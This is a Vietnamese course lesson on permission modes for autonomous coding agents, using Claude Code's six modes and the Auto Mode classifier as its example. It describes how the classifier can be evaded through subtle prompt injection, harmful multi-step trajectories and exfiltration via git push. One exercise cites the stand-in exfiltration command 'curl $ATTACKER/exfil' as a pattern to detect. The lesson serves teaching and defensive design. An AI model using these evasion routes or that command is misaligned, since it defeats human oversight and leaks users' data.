# Các Chế độ Quyền hạn cho Tác nhân Tự hành (Autonomous Agents)

> Một thang đo quyền hạn — các cấp độ tự hành được phân bậc từ việc xem xét mọi hành động đến phê duyệt mọi thứ — là cách một hệ thống kiểm soát những gì một tác nhân tự hành có thể thực hiện mà không cần hỏi ý kiến. Claude Code, ví dụ thực tế trong bài học này, cung cấp sáu chế độ như vậy: "plan" hỏi trước mọi hành động, "default" (được gắn nhãn "Manual" trong giao diện người dùng) chỉ hỏi đối với các hành động rủi ro, "acceptEdits" tự động phê duyệt việc ghi tệp nhưng vẫn xác nhận việc thực thi shell, và "bypassPermissions" phê duyệt mọi thứ. Auto Mode — chế độ quyền hạn `auto` — thay thế việc phê duyệt từng hành động bằng một mô hình phân loại riêng biệt, mô hình này xem xét từng hành động trước khi nó chạy và chặn bất kỳ hành động nào vượt quá phạm vi yêu cầu. Ngân sách hành động được thực thi thông qua `max_turns` và `max_budget_usd`. Khả năng truy cập `auto` phụ thuộc vào gói dịch vụ, quyền của tổ chức, mô hình và nhà cung cấp — và Anthropic khẳng định rõ ràng rằng mô hình phân loại không đủ để đảm bảo an toàn nếu đứng một mình.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## Vấn đề

Một tác nhân lập trình tự hành trên máy tính của bạn thuộc một danh mục bảo mật riêng biệt. Bề mặt tấn công chính là mọi thứ mà tác nhân có thể tiếp cận — hệ thống tệp, mạng, thông tin xác thực, clipboard, bất kỳ tab trình duyệt nào, bất kỳ terminal nào đang mở. Bruce Schneier và những người khác đã công khai cảnh báo về điều này: các tác nhân sử dụng máy tính không phải là một "bản cập nhật tính năng" của chatbot, chúng là một loại công cụ mới với hồ sơ rủi ro mới.

Hệ thống quyền hạn của Claude Code là câu trả lời của Anthropic. Thay vì chỉ có một công tắc "tự hành / không tự hành", có sáu chế độ trải dài trên một thang đo năng lực: plan → default → acceptEdits → … → bypassPermissions. Mỗi chế độ là một sự đánh đổi khác nhau giữa tốc độ và việc xem xét từng hành động. Auto Mode (tháng 3 năm 2026) bổ sung một mô hình phân loại riêng biệt giúp đưa việc phê duyệt ra khỏi luồng công việc chính của người dùng: nó xem xét từng hành động trước khi thực thi và chặn bất kỳ hành động nào leo thang ngoài yêu cầu.

Câu hỏi kỹ thuật đặt ra là: hệ thống này bắt được những gì, bỏ lỡ những gì, và chế độ nào thực sự phù hợp cho một tác vụ cụ thể?

## Khái niệm

### Sáu chế độ quyền hạn

| Chế độ | Hành vi | Khi nào nên sử dụng |
|---|---|---|
| `plan` | Tác nhân đề xuất kế hoạch; người dùng phê duyệt toàn bộ kế hoạch; mọi hành động đều được xem xét trước khi thực thi | Tác vụ không quen thuộc; mã nguồn gần môi trường production; lần đầu sử dụng tác nhân trên một repo |
| `default` | Được gắn nhãn "Manual" trong giao diện. Tác nhân thực hiện hành động; nhắc người dùng đối với bất kỳ hành động "rủi ro" nào (thực thi shell, thao tác phá hủy, gọi mạng) | Hầu hết các phiên lập trình tương tác |
| `acceptEdits` | Việc ghi tệp được tự động phê duyệt; thực thi shell và gọi mạng vẫn yêu cầu xác nhận | Quá trình refactor trên nhiều tệp |
| `auto` | Một mô hình phân loại riêng biệt xem xét từng hành động trước khi thực thi; chặn bất kỳ hành động nào leo thang ngoài yêu cầu | Các phiên chạy dài hạn không cần giám sát trong không gian làm việc bị hạn chế |
| `dontAsk` | Không bao giờ nhắc; các hành động không được phê duyệt trước bởi các quy tắc quyền hạn sẽ bị từ chối | Các sandbox tạm thời, công việc CI, tập lệnh nghiên cứu |
| `bypassPermissions` | Phê duyệt mọi thứ | Được ghi chú là "chỉ sử dụng bên trong các container tạm thời mà bạn sẵn sàng loại bỏ" |

(Các tên ở trên khớp với tài liệu công khai của Claude Code; giao diện người dùng gắn nhãn `default` là "Manual".)

### Auto Mode trong một trang

Auto Mode (ra mắt ngày 24 tháng 3 năm 2026) là chế độ quyền hạn đầu tiên ủy quyền việc phê duyệt từng hành động cho một mô hình. Cấu trúc:

1. **Một mô hình phân loại riêng biệt.** Xem xét mọi hành động được đề xuất trước khi thực thi, đánh giá dựa trên tác vụ đã khai báo và trạng thái hiện tại của phiên làm việc, đồng thời chặn bất kỳ hành động nào leo thang ngoài yêu cầu. Các hành động bị chặn sẽ quay trở lại yêu cầu người dùng phê duyệt.
2. **Tính khả dụng có kiểm soát.** Việc `auto` có được cung cấp hay không phụ thuộc vào gói dịch vụ, quyền của tổ chức, mô hình và nhà cung cấp.

Các kiểm soát ngân sách nằm song song với mô hình phân loại:

- `max_turns` — tổng số lần lặp trong một phiên.
- `max_budget_usd` — giới hạn chi phí bằng đô la sẽ hủy phiên làm việc.
- giới hạn số lượng hành động trên mỗi công cụ (không quá N lệnh gọi `WebFetch`, v.v.).

### Những gì hệ thống bắt được

- Tiêm lệnh (prompt injection) trực tiếp vào đầu vào của công cụ, nơi hướng dẫn được tiêm ánh xạ tới một dạng hành động rủi ro đã biết.
- Các vòng lặp công cụ lặp đi lặp lại — mô hình phân loại có thể thấy hành động N+1 gần như giống hệt hành động N, năm lần liên tiếp.
- Các lệnh shell rõ ràng nằm ngoài phạm vi trong một phiên chỉ dành cho chỉnh sửa tệp.

### Những gì hệ thống có thể bỏ lỡ

- **Tiêm lệnh tinh vi** làm thay đổi hành vi mà không tạo ra một hành động bị gắn cờ nào. Tiêm lệnh gián tiếp không phải là một lỗ hổng có thể vá hoàn toàn (theo người đứng đầu bộ phận chuẩn bị của OpenAI, 2025, về các tác nhân trình duyệt — xem Bài 11).
- **Hành vi sai lệch ở cấp độ ngữ nghĩa.** Mỗi hành động riêng lẻ có thể trông an toàn trong khi quỹ đạo tổng thể lại gây hại. Mô hình phân loại đánh giá hành động; nó không suy luận lại ý định của người dùng.
- **Rò rỉ dữ liệu qua các kênh hợp pháp.** Ghi dữ liệu vào một tệp bạn sở hữu, sau đó `git push` vào một repo công khai, là một chuỗi các hành động được cho phép nhưng sự kết hợp của chúng lại là vấn đề.

### Định hướng bản xem trước nghiên cứu

Anthropic đã phát hành Auto Mode dưới dạng bản xem trước nghiên cứu. Tài liệu nêu rõ rằng mô hình phân loại là một lớp bảo vệ, không phải là giải pháp hoàn chỉnh: người dùng được kỳ vọng sẽ kết hợp Auto Mode với ngân sách, danh sách cho phép (allowlists), không gian làm việc cô lập và kiểm tra quỹ đạo (Bài 12–16). Định hướng bản xem trước cũng phản ánh khoảng cách giữa đánh giá và triển khai (Bài 1) — một mô hình phân loại vượt qua các bài kiểm tra ngoại tuyến có thể hoạt động khác biệt trong một phiên thực tế nơi ngữ cảnh của người dùng không rõ ràng.

### Vị trí của thang đo này trong quy trình làm việc của bạn

- Tác vụ không quen thuộc: bắt đầu ở `plan`. Đọc kế hoạch rẻ hơn so với việc hoàn tác một phiên chạy lỗi.
- Refactor đã biết: `acceptEdits` giúp tiết kiệm rất nhiều lần nhấp xác nhận.
- Chạy nền không giám sát: `auto` chỉ bên trong không gian làm việc mà bạn đã đo lường phạm vi ảnh hưởng (không có thông tin xác thực, không có mount production, không có lưu lượng truy cập ra ngoài mà bạn không chọn).
- Container tạm thời: `dontAsk` / `bypassPermissions` chỉ chấp nhận được nếu container và thông tin xác thực của nó là loại dùng một lần.

```figure
autonomy-oversight
```

## Sử dụng

`code/main.py` mô phỏng một mô hình phân loại xem xét hành động dưới dạng quy trình hai giai đoạn — một sự đơn giản hóa để giảng dạy; chế độ `auto` thực tế được hỗ trợ bởi một mô hình phân loại riêng biệt, không phải là một hợp đồng hai giai đoạn được ghi lại. Giai đoạn 1 là một quy tắc từ khóa giá rẻ trên các hành động được đề xuất; Giai đoạn 2 là một trình xem xét đa quy tắc chậm hơn. Trình điều khiển đưa vào một quỹ đạo tổng hợp ngắn (các hành động an toàn, một nỗ lực tiêm lệnh, một vòng lặp lặp lại) và cho thấy nơi mô hình phân loại bắt được và nơi nó bỏ lỡ.

## Triển khai

`outputs/skill-permission-mode-picker.md` khớp mô tả tác vụ với chế độ quyền hạn, giới hạn ngân sách và yêu cầu cô lập phù hợp.

## Bài tập

1. Chạy `code/main.py`. Loại hành động tổng hợp nào không bao giờ bị gắn cờ bởi Giai đoạn 1 nhưng luôn bị bắt bởi Giai đoạn 2? Loại nào không bị bắt bởi cả hai?

2. Mở rộng tập quy tắc Giai đoạn 1 để bắt một dạng hành vi xấu cụ thể đã biết (ví dụ: `curl $ATTACKER/exfil`). Đo lường tỷ lệ dương tính giả trên mẫu hành động lành tính.

3. Đọc tài liệu "How the agent loop works" của Anthropic. Liệt kê mọi trạng thái bên ngoài mà tác nhân chạm vào theo mặc định ở chế độ `default`. Bạn sẽ cần kiểm soát riêng những gì trước khi chạy `auto` mà không cần giám sát?

4. Thiết kế ngân sách cho phiên chạy 24 giờ không giám sát: `max_turns`, `max_budget_usd`, giới hạn mỗi công cụ, danh sách cho phép. Giải trình cho từng con số.

5. Mô tả một quỹ đạo nơi mọi hành động riêng lẻ đều được mô hình phân loại phê duyệt, nhưng hành vi tổng thể lại bị lệch hướng. (Bài 14 đề cập cách các công tắc ngắt (kill switches) và canary tokens giải quyết vấn đề này.)

## Thuật ngữ chính

| Thuật ngữ | Cách gọi thông thường | Ý nghĩa thực tế |
|---|---|---|
| Permission mode | "Tác nhân có thể làm được bao nhiêu" | Một trong sáu chính sách được đặt tên kiểm soát việc phê duyệt từng hành động |
| plan mode | "Hỏi trước mọi thứ" | Tác nhân viết kế hoạch; người dùng phê duyệt trước khi thực thi |
| acceptEdits | "Cho phép ghi tệp" | Việc ghi tệp tự động phê duyệt; thực thi shell vẫn nhắc |
| auto | "Tự động phê duyệt" | Mô hình phân loại riêng biệt xem xét từng hành động; chặn leo thang ngoài yêu cầu |
| bypassPermissions | "Full YOLO" | Phê duyệt mọi thứ; dành cho các container tạm thời |
| Stage 1 (simulator) | "Kiểm tra từ khóa nhanh" | Quy tắc giá rẻ trên các hành động được đề xuất trong `code/main.py` |
| Stage 2 (simulator) | "Xem xét sâu" | Trình xem xét đa quy tắc chậm hơn cho các hành động bị gắn cờ trong `code/main.py` |
| Research preview | "Chưa phát hành chính thức" | Cách Anthropic định hướng cho các tính năng mà chế độ lỗi vẫn đang được lập bản đồ |

## Đọc thêm

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — các chế độ quyền hạn, ngân sách, định dạng hành động.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — mô hình thực thi dịch vụ được quản lý.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — bề mặt tính năng và thông báo về Auto Mode.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — lớp dựa trên lý luận định hình các đánh giá của mô hình phân loại.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — góc nhìn nội bộ về thiết kế quyền hạn dài hạn.